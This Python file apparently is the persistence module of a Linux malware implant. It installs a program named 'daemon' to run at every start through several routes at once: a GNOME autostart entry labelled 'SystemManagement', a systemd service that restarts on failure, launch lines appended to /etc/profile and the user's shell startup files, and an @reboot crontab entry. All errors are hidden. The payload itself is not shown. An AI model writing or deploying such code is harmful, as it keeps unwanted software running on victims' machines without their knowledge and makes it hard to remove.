import variables

import os
import subprocess
import shutil

def startup():
    desktop = \
'''[Desktop Entry]
Type=Application
Name=daemon
Exec={}
Icon=
Comment=SystemManagement
X-GNOME-Autostart-enabled=true
'''.format(variables.daemon_path)

    with open(variables.daemon_desktop, 'w') as f:
        f.write(desktop)

    startup_path = os.path.join(variables.home, '.config/autostart')
    try:
        os.mkdir(startup_path)
    except:
        pass

    shutil.copy2(variables.daemon_desktop, startup_path)


def systemctl():
    service = \
'''Description=daemon
Wants=network.target
After=syslog.target network-online.target
[Service]
Type=simple
ExecStart={}
Restart=on-failure
RestartSec=10
KillMode=process
[Install]
WantedBy=multi-user.target'''.format(variables.daemon_path)

    with open(variables.daemon_service, 'w') as f:
        f.write(service)

    try:
        shutil.copy2(variables.daemon_service, '/lib/systemd/system/daemon.service')
    except:
        pass
    
    commands = 'systemctl daemon-reload; systemctl enable daemon.service; \
        systemctl start daemon.service'
        
    os.system(commands)


def bashrcs():
    alias = "alias 'daemon'='{}';\n".format(variables.daemon_path)
    daemon = "daemon;\n"

    paths = ['/etc/profile', '{}/.bash_profile', '{}/.bash_login',
             '{}/.profile', '{}/.bashrc']
    paths = [p.format(variables.home) for p in paths]

    for filepath in paths:
        try:
            with open(filepath, 'a') as f:
                f.write(alias)
                f.write(daemon)
        except:
            pass            


def crontab():
    command = '''(crontab -l 2>/dev/null; echo "@reboot {}") | crontab -'''.format(variables.daemon_path)
    os.system(command)
    
    